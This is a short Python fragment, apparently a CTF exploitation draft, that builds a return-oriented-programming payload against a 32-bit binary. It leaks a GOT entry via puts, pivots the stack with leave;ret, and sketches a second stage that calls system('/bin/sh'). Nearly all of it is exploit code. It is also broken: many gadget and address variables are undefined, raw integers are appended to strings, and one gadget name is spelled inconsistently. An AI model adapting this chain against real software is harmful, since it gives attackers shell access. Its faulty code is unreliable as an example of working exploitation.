leave_ret = 0x080485d8
puts_plt = 0x8048510
__stack_got = 0x0804B01C

payload  = ''
payload += p32(leave_ret)
payload += 'h'*0x114/3
payload += 'a'*(0x114%3)
payload += 'bbbb'
payload += pop_ebp_ret
payload += __stack_got
payload += puts_plt
payload += pop_ebp_ret
payload += puts_got
payload += input
payload += pop2_ret
payload += addr
payload += 2000
payload += popebp_ret
payload += addr
payload += leave_ret

'''
payload  = ''
payload += system
payload += system
payload += binsh_addr
payload += binsh_addr
payload += '/bin/sh'





1.shellcode write got
2.change ebp continue ROP
'''
